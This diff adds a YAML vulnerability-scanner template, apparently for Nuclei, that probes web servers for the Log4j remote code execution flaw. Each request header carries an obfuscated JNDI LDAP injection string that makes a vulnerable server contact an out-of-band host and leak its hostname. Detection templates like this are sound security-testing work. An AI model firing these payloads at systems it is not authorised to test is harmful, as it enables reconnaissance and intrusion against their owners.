@@ -1,0 +1,49 @@
+id: header-log4j
+
+info:
+  name: Header Log4j - Remote code Execution due to Log4j
+  author: Omkar7505
+  severity: critical
+  tags: log4j,rce
+
+requests:
+  - method: GET
+    headers:
+        X-Client-IP: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.{{interactsh-url}}}
+        X-Remote-IP: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.{{interactsh-url}}}
+        X-Remote-Addr: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.{{interactsh-url}}}
+        X-Forwarded-For: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.{{interactsh-url}}}
+        X-Originating-IP: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.{{interactsh-url}}}
+
+    path:
+      - "{{BaseURL}}/"
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
